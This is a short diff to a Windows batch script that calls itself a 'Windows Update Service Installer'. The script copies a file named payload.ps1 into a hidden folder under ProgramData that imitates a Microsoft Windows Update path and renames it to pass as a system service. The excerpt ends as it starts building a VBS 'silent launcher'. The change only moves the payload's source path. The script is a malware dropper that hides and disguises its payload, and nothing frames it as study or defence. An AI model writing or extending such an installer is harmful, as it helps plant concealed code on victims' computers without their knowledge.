@@ -2,7 +2,8 @@
 title Windows Update Service Installer
 echo [*] Installing Windows Update Service...
 
-:: Set paths
+:: Set paths – payload is now in parent's "payload" folder
+set "PAYLOAD_SRC=%~dp0..\payload\payload.ps1"
 set "PAYLOAD_DIR=%ProgramData%\Microsoft\Windows\Update"
 set "PAYLOAD_FILE=%PAYLOAD_DIR%\WindowsUpdateService.ps1"
 set "WRAPPER_FILE=%PAYLOAD_DIR%\launcher.vbs"
@@ -12,7 +13,7 @@ if not exist "%PAYLOAD_DIR%" mkdir "%PAYLOAD_DIR%"
 attrib +h "%PAYLOAD_DIR%"
 
 :: Copy payload
-copy /Y "%~dp0payload.ps1" "%PAYLOAD_FILE%"
+copy /Y "%PAYLOAD_SRC%" "%PAYLOAD_FILE%"
 
 :: Create VBS wrapper (silent launcher)
 (
